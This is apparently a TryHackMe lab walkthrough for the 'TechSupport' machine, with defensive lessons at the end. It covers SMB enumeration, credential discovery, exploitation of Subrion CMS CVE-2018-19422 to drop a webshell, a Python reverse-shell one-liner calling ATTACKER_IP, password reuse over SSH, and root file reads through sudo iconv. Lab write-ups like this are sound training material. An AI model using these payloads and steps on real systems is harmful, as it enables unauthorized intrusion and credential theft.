# TryHackMe - TechSupport Walkthrough

## Challenge Information

| Category     | Value                                                                                                                         |
| ------------ | ----------------------------------------------------------------------------------------------------------------------------- |
| Platform     | TryHackMe                                                                                                                     |
| Machine Name | TechSupport                                                                                                                   |
| Difficulty   | Easy                                                                                                                          |
| Type         | Linux Boot2Root                                                                                                               |
| Objective    | Enumerate exposed SMB shares, gain access through a vulnerable CMS, obtain user credentials, and escalate privileges to root. |

---

# Introduction

Today we are solving another TryHackMe machine named **TechSupport**.

This is a Linux-based boot-to-root machine where the attack path involves:

* SMB enumeration
* Credential discovery
* Subrion CMS exploitation
* User credential reuse
* Privilege escalation through sudo misconfiguration

---

# Target Information

```text
Main IP :: 10.49.136.73
```

---

# Initial Enumeration

## Nmap All Port Scan

We begin with a full TCP port scan.

```bash
nmap -p- 10.49.136.73
```

Output:

```text
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

Interesting services:

* SSH
* HTTP
* SMB

---

# Service Enumeration

Running service and version detection:

```bash
nmap -sCV -p22,80,139,445 10.49.136.73
```

Results:

```text
22/tcp  open  OpenSSH 7.2p2 Ubuntu
80/tcp  open  Apache 2.4.18
139/tcp open  Samba
445/tcp open  Samba 4.3.11-Ubuntu
```

Host information:

```text
Host: TECHSUPPORT
```

The Samba service immediately becomes an attractive target.

---

# SMB Enumeration

Running Enum4Linux:

```bash
enum4linux -A 10.49.136.73
```

Important findings:

```text
Shares:

IPC$
print$
websvr
```

The share **websvr** is accessible anonymously.

---

# Accessing SMB Share

Connecting to the share:

```bash
smbclient \\\\10.49.136.73\\websvr
```

Listing contents:

```bash
ls
```

Output:

```text
enter.txt
```

Downloading file:

```bash
get enter.txt
```

---

# Reading enter.txt

Contents:

```text
GOALS
=====

1) Make fake popup and host it online on Digital Ocean server
2) Fix subrion site, /subrion doesn't work, edit from panel
3) Edit wordpress website

IMP
===

Subrion creds

admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk

[base58,base32,base64]

Scam2021
```

This immediately gives us:

```text
Subrion Username: admin
Subrion Password: Scam2021
```

We also learn that a Subrion installation exists.

---

# Web Enumeration

Visiting:

```text
http://10.49.136.73
```

We only receive the default Apache page.

Because the note referenced Subrion, we enumerate directly.

---

# Subrion Discovery

Visiting:

```text
http://10.49.136.73/subrion/
```

Checking robots.txt:

```text
http://10.49.136.73/subrion/robots.txt
```

Output:

```text
Disallow: /backup/
Disallow: /cron/
Disallow: /front/
Disallow: /install/
Disallow: /panel/
Disallow: /tmp/
Disallow: /updates/
```

The admin panel is exposed.

---

# CMS Version Enumeration

The login page reveals:

```text
Powered by Subrion CMS v4.2.1
```

Searching ExploitDB:

```bash
searchsploit subrion 4.2.1
```

Result:

```text
Subrion CMS 4.2.1 - Arbitrary File Upload
CVE-2018-19422
```

Copy exploit:

```bash
searchsploit -m 49876
```

---

# Exploitation

Running exploit:

```bash
python 49876.py \
-u http://10.49.136.73/subrion/panel/ \
--user=admin \
--passw=Scam2021
```

Output:

```text
Login Successful

Upload Success

Webshell path:
http://10.49.136.73/subrion/panel/uploads/haziyaucgjdtksy.phar
```

Testing shell:

```bash
whoami
```

Output:

```text
www-data
```

Initial access achieved.

---

# Obtaining Reverse Shell

Using a Python reverse shell:

```python
python3 -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("ATTACKER_IP",4444));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
import pty;
pty.spawn("bash")'
```

Listener:

```bash
nc -lvnp 4444
```

Connection received.

---

# Shell Stabilization

Spawn PTY:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Background shell:

```bash
CTRL+Z
```

Fix terminal:

```bash
stty raw -echo
fg
```

Set terminal:

```bash
export TERM=xterm
```

Shell stabilized successfully.

---

# User Enumeration

Checking local users:

```bash
cat /etc/passwd
```

Interesting user:

```text
scamsite:x:1000:1000:scammer,,,:/home/scamsite:/bin/bash
```

---

# Credential Discovery

While enumerating web files we discover WordPress configuration.

File:

```bash
cat /var/www/html/wordpress/wp-config.php
```

Credentials:

```php
define('DB_USER','support');
define('DB_PASSWORD','ImAScammerLOL!123!');
```

Password discovered:

```text
ImAScammerLOL!123!
```

---

# SSH Access

Testing password reuse:

```bash
ssh scamsite@10.49.136.73
```

Password:

```text
ImAScammerLOL!123!
```

Success.

We now have shell access as:

```text
scamsite
```

---

# User Enumeration

Listing home directory:

```bash
ls
```

Output:

```text
websvr
```

User access achieved.

---

# Privilege Escalation

Checking sudo permissions:

```bash
sudo -l
```

Output:

```text
User scamsite may run the following commands:

(ALL) NOPASSWD: /usr/bin/iconv
```

This is a known GTFOBins entry.

Reference:

```text
https://gtfobins.org/gtfobins/iconv/
```

---

# Root Privilege Escalation

Because iconv is allowed via sudo, we can abuse it to read privileged files.

Example:

```bash
sudo iconv -f 8859_1 -t 8859_1 /root/root.txt
```

Or spawn elevated file access through GTFOBins techniques.

Reading root flag:

```bash
sudo iconv -f 8859_1 -t 8859_1 /root/root.txt
```

Root flag successfully obtained.

---

# Attack Path Summary

```text
Nmap Enumeration
        ↓
SMB Enumeration
        ↓
Anonymous Share Access
        ↓
enter.txt Retrieved
        ↓
Subrion Credentials Found
        ↓
Subrion CMS Login
        ↓
CVE-2018-19422 Exploitation
        ↓
Web Shell
        ↓
Reverse Shell as www-data
        ↓
WordPress Credentials Found
        ↓
Password Reuse
        ↓
SSH Access as scamsite
        ↓
sudo -l
        ↓
iconv GTFOBins Abuse
        ↓
Root Access
```

---

# Important Findings

## SMB Share

```text
websvr
```

Contained sensitive internal notes and credentials.

---

## Subrion Credentials

```text
Username: admin
Password: Scam2021
```

---

## WordPress Credentials

```text
DB_USER=support
DB_PASSWORD=ImAScammerLOL!123!
```

---

## Vulnerable Software

```text
Subrion CMS 4.2.1
```

Vulnerability:

```text
CVE-2018-19422
```

Arbitrary File Upload leading to Remote Code Execution.

---

## Sudo Misconfiguration

```text
(ALL) NOPASSWD: /usr/bin/iconv
```

Allowed privilege escalation through GTFOBins.

---

# Lessons Learned

### SMB Security

Never expose sensitive credentials inside anonymous network shares.

### Credential Reuse

Database credentials should never match operating system user passwords.

### CMS Security

Outdated CMS installations frequently contain public RCE vulnerabilities.

### Principle of Least Privilege

Granting unrestricted sudo access to utilities listed on GTFOBins can result in complete system compromise.

---

# Conclusion

TechSupport is a straightforward but realistic machine demonstrating how small security mistakes combine into a full compromise. Anonymous SMB access exposed sensitive credentials, outdated CMS software allowed remote code execution, credential reuse granted SSH access, and an unsafe sudo configuration resulted in complete root compromise.

The machine highlights the importance of secure credential management, patch management, restricted file sharing, and careful sudo permission assignments.
